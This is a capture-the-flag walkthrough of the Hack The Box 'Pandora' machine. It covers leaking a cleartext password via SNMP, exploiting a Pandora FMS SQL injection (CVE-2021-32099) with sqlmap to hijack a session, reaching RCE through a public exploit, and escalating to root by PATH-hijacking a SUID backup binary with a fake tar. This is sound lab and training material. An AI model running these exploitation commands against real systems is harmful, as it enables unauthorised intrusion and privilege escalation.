---
title: Pandora
date: 2026-09-04
description: Easy Linux box leaking credentials through a public SNMP process list, hitting an internal Pandora FMS instance via port forward, session-hijacking with CVE-2021-32099, and hijacking a SUID backup binary's PATH.
tags:
  - htb
  - Easy
  - Linux
---

# Initial Recon

```
# Nmap 7.98 scan initiated Fri Sep  4 09:49:30 2026 as: /usr/lib/nmap/nmap -p22,80 -A -oN scan_results.txt 10.129.6.40
Nmap scan report for pandora.htb (10.129.6.40)
Host is up (0.61s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   659.86 ms 10.10.16.1
2   355.64 ms pandora.htb (10.129.6.40)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep  4 09:50:09 2026 -- 1 IP address (1 host up) scanned in 38.55 seconds
```

Navigating to port 80 turns up nothing interesting.

```
# Nmap 7.98 scan initiated Fri Sep  4 09:50:09 2026 as: /usr/lib/nmap/nmap -sU -sV -F -open -oN udp_scan_results.txt 10.129.6.40
Nmap scan report for pandora.htb (10.129.6.40)
Host is up (0.47s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT    STATE         SERVICE VERSION
68/udp  open|filtered dhcpc
161/udp open          snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: pandora

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep  4 09:53:33 2026 -- 1 IP address (1 host up) scanned in 203.79 seconds
```

**onesixtyone** can be used to find the **community string**:

```sh
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 10.129.6.40
```

It identified `public` as the community string:

```sh
snmpwalk -v1 -c public 10.129.6.40
```

The walk takes a long time — but eventually it revealed clear-text strings, user & pass:

```sh
<SNIP>
iso.3.6.1.2.1.25.4.2.1.5.958 = STRING: "-o -p - Wu --noclear ttyl linux"

iso.3.6.1.2.1.25.4.2.1.5.1005 = ""

iso.3.6.1.2.1.25.4.2.1.5.1019 = STRING: "-k start"

iso.3.6.1.2.1.25.4.2.1.5.1114 = STRING: "-u daniel -p HotelBabylon23"

<SNIP>
```

> `daniel - HotelBabylon23`

# User

SSH in as daniel, but **matt** holds the user flag.

```sh
netstat -antp

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 10.129.6.40:22          10.10.16.82:57770       ESTABLISHED -
tcp        0      1 10.129.6.40:45414       1.1.1.1:53              SYN_SENT    -
tcp        0     72 10.129.6.40:22          10.10.16.82:52480       ESTABLISHED -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -

```

A web server is running internally. Set up a local port forward — the target isn't configured for dynamic forwarding:

```sh
ssh -L 80:127.0.0.1:80 daniel@10.129.6.40
```

> Version => `PANDORA FMS v7.0NG.742_FIX_PERL2020`

Logging in as Daniel errors out, so a bit of Googling revealed that RCE with authentication is possible. To gain that authentication, we need the unauthenticated SQL injection in CVE-2021-32099:

> Reference : https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/

The blog states the `/include/chart_generator.php` **endpoint** uses `session_id` for a query and is **vulnerable** (not properly sanitized):

```url
http://localhost/pandora_console/include/chart_generator.php?session_id=
```

### sqlmap

```sh
sqlmap --url "http://localhost/pandora_console/include/chart_generator.php?session_id=''" --current-db
```

```sh
sqlmap --url "http://localhost/pandora_console/include/chart_generator.php?session_id=''" -D pandora --tables 
```

Of the 178 tables, **2** look interesting: `tpassword_history` and `tsession_php`. Fetch them with `sqlmap`:

```sh
sqlmap --url "http://localhost/pandora_console/include/chart_generator.php?session_id=''" -T tpassword_history --dump
```

The password history couldn't be decrypted, so dump the second table instead:

```sh
sqlmap --url "http://localhost/pandora_console/include/chart_generator.php?session_id=''" -T tsession_php --dump
```

This gives us the **session ID** of user `matt`

> Note: **Cookie manager** didn't do a good job

Drop it into the `session_id` parameter of the URL:

```url
http://localhost/pandora_console/include/chart_generator.php?session_id=g4e01qdgk36mfdh90hvcc54umq
```

Once it loads, navigate to the home page — we're authenticated as `matt`.

Now that we're authenticated, there are 2 ways to get RCE:

- CVE-2020-5844 : RCE -> https://github.com/UNICORDev/exploit-CVE-2020-5844 - won't work, we're restricted from that page
- CVE-2020-13851 : RCE -> https://packetstorm.news/files/id/158390 - this one worked

### Burpsuite

To listen to localhost we have to configure **firefox** first — in the url, set `about:config` -> `network.proxy.allow_hijacking_localhost` -> true.

Now we can intercept the local traffic — the setting is usually false as a safety precaution.

Grab the `ajax` endpoint's **POST** request — it fires when you click the **event** tab in the side menu.

> Reference: 
> https://github.com/hadrian3689/pandorafms_7.44/blob/master/pandorafms_7.44.py
> https://packetstorm.news/files/id/158390

Reviewing the reference shows which parameter to modify — the **target** parameter **holds** the **payload**.

Editing the request according to the reference gains an **unstable shell** as **matt**, so stabilize it with a Python one-liner and add an SSH public key for a stable shell as **matt**.

# Root

Listing **sudoers** requires a password, so look for binaries with SUID permissions instead:

```
find / -perm -4000 2>/dev/null
```

This command lists the results in **detail** by executing ls after finding them:

```
find / -perm -4000 -exec ls -al {} \; 2>/dev/null
```

`/usr/bin/pandora_backup` turns up — a SUID binary that can be read and executed by **matt**.

> **strings** binary is not available in target

We started a python server to transfer the binary to the attacker and reviewed it with strings.

Looks like it calls the **tar** binary to back up files — and it doesn't use an absolute path.

Prepend `/tmp` to the PATH variable:

```sh
export PATH="/tmp:$PATH"
```

Create a fake tar binary with a shell payload in the tmp directory:

```sh
echo "/bin/bash -p" > tar
```

Then execute the `pandora_backup` binary.

Gained `root`
